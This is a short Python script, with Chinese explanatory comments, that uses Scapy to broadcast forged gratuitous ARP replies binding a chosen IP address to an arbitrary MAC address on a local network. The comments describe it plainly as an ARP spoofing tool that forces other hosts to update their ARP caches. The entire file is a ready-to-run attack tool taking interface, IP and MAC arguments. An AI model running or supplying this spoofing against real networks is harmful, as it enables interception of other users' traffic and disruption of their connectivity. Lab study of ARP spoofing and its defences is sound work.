#!/usr/bin/env python3

#from scapy.all import *
import sys
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sendp

# 这个 Python 脚本的核心功能是发送伪造的免费（无偿）ARP 数据包（Gratuitous ARP），属于 ARP 欺骗（ARP Spoofing）相关的工具类脚本，以下是详细解析：
# 1. 核心原理
# ARP（地址解析协议）用于将 IP 地址映射为 MAC 地址，而免费 ARP 是一种特殊的 ARP 报文（无需请求直接宣告），脚本中通过设置 ARP(op=2)（代表 ARP 响应报文）来构造这类数据包，核心行为是：
# 向局域网内广播（dst="ff:ff:ff:ff:ff:ff"）宣告指定的 src_ip 对应的 MAC 地址是 src_mac；
# 强制局域网内其他设备更新 ARP 缓存，把该 IP 绑定到伪造的 MAC 地址上。
# python3 send_spoof_arp.py eth0 192.168.1.100 00:11:22:33:44:55
def send_spoofed_arp(iface, src_ip, src_mac):
    try:
        #arp_packet = ARP(op=1, pdst=src_ip, psrc=src_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=src_mac)
        #sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)/arp_packet, iface=iface, verbose=False)  # sendp for specifying interface
        arp_packet = ARP(op=2, pdst=src_ip, psrc=src_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=src_mac)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac)/arp_packet, iface=iface, verbose=False)  # sendp for specifying interface

        print(f"Sent spoofed gratuitous ARP request to from {src_ip} ({src_mac}) via interface {iface}")

    except Exception as e:
        print(f"Error sending gratuitous ARP packet: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: send_spoof_arp.py <interface> <source_ip> <source_mac>")
        sys.exit(1)
    # Get parameters from the command line (optional, for more robust usage)
    #  You could use argparse for better command-line argument handling.
    iface = sys.argv[1]
    src_ip = sys.argv[2]
    src_mac = sys.argv[3]
    send_spoofed_arp(iface, src_ip, src_mac)
